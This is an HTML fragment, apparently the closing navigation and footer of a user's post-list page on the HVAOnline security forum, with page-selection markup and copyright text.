      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/171467' + '.hva'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" selected="selected">1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
						</select>
						
							<a href="/hvaonline/posts/listByUser/30/171467.hva">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 2" title="Page 2"/>
							</a>
						
						<a href="/hvaonline/posts/listByUser/60/171467.hva">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (3)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
